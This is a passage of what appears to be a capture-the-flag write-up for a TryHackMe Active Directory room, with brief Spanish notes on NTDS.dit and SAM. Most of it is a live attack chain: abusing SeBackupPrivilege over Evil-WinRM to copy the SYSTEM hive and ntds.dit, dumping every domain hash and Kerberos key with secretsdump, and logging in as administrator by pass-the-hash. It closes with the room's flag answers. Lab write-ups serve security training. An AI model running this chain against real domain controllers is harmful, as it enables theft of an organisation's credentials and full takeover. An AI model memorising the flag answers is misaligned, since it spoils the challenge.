*Evil-WinRM* PS C:\tmp> Set-SeBackupPrivilege
*Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM C:\tmp\system
The operation completed successfully.

*Evil-WinRM* PS C:\tmp> copy-filesebackupprivilege x:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite
*Evil-WinRM* PS C:\tmp> dir


    Directory: C:\tmp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        7/21/2023   5:13 PM            239 diskshadow.txt
-a----        7/21/2023   5:14 PM            643 metadata.cab
-a----        7/21/2023   5:20 PM       16777216 ntds.dit
-a----        7/21/2023   5:13 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----        7/21/2023   5:13 PM          16384 SeBackupPrivilegeUtils.dll
-a----        7/21/2023   5:19 PM       18083840 system

dit (NT Directory Services Database) NTDS. dit es el **archivo de base de datos principal utilizado por el servicio Active Directory en los sistemas operativos Windows Server**. Almacena información relacionada con los objetos de Active Directory, incluidos usuarios, grupos, equipos y otros objetos de directorio.

El administrador de cuentas de seguridad o SAM (del inglés Security Account Manager) **es una base de datos almacenada como un fichero del registro en Windows NT, Windows 2000, y versiones posteriores de Microsoft Windows**. Almacena las contraseñas de los usuarios en un formato con hash (seguro, cifrado).

*Evil-WinRM* PS C:\tmp> download C:\tmp\system /home/witty/Downloads/system
Info: Downloading C:\tmp\system to /home/witty/Downloads/system

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\tmp> download C:\tmp\ntds.dit /home/witty/Downloads/ntds.dit
Info: Downloading C:\tmp\ntds.dit to /home/witty/Downloads/ntds.dit

                                                             
Info: Download successful!

┌──(witty㉿kali)-[~/Downloads]
└─$ secretsdump.py -system system -ntds ntds.dit LOCAL               
Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra

[*] Target system bootKey: 0xeafd8ccae4277851fc8684b967747318
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 76cf6bbf02e743fac12666e5a41342a7
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9653b02d945329c7270525c4c2a69c67:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
FUSION-DC$:1000:aad3b435b51404eeaad3b435b51404ee:06dad9b238c644fdc20c7633b82a72c6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:feabe44b40ad2341cdef1fd95297ef38:::
fusion.corp\lparker:1103:aad3b435b51404eeaad3b435b51404ee:5a2ed7b4bb2cd206cc884319b97b6ce8:::
fusion.corp\jmurphy:1104:aad3b435b51404eeaad3b435b51404ee:69c62e471cf61441bb80c5af410a17a3:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:4db79e601e451bea7bb01d0a8a1b5d2950992b3d2e3e750ab1f3c93f2110a2e1
Administrator:aes128-cts-hmac-sha1-96:c0006e6cbd625c775cb9971c711d6ea8
Administrator:des-cbc-md5:d64f8c131997a42a
FUSION-DC$:aes256-cts-hmac-sha1-96:3512e0b58927d24c67b6d64f3d1b71e392b7d3465ae8e9a9bc21158e53a75088
FUSION-DC$:aes128-cts-hmac-sha1-96:70a93c812e563eb869ba00bcd892f76a
FUSION-DC$:des-cbc-md5:04b9ef07d9e0a279
krbtgt:aes256-cts-hmac-sha1-96:82e655601984d4d9d3fee50c9809c3a953a584a5949c6e82e5626340df2371ad
krbtgt:aes128-cts-hmac-sha1-96:63bf9a2734e81f83ed6ccb1a8982882c
krbtgt:des-cbc-md5:167a91b383cb104a
fusion.corp\lparker:aes256-cts-hmac-sha1-96:4c3daa8ed0c9f262289be9af7e35aeefe0f1e63458685c0130ef551b9a45e19a
fusion.corp\lparker:aes128-cts-hmac-sha1-96:4e918d7516a7fb9d17824f21a662a9dd
fusion.corp\lparker:des-cbc-md5:7c154cb3bf46d904
fusion.corp\jmurphy:aes256-cts-hmac-sha1-96:7f08daa9702156b2ad2438c272f73457f1dadfcb3837ab6a92d90b409d6f3150
fusion.corp\jmurphy:aes128-cts-hmac-sha1-96:c757288dab94bf7d0d26e88b7a16b3f0
fusion.corp\jmurphy:des-cbc-md5:5e64c22554988937
[*] Cleaning up... 

┌──(witty㉿kali)-[~/Downloads]
└─$ evil-winrm -i 10.10.235.31 -u administrator -H 9653b02d945329c7270525c4c2a69c67

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2021   6:05 AM             37 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
THM{f72988e57bfc1deeebf2115e10464d15}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
fusion\administrator



```


User 1  

*THM{c105b6fb249741b89432fada8218f4ef}*

User 2  

*THM{b4aee2db2901514e28db4242e047612e}*

User 3

*THM{f72988e57bfc1deeebf2115e10464d15}*

[[Weasel]]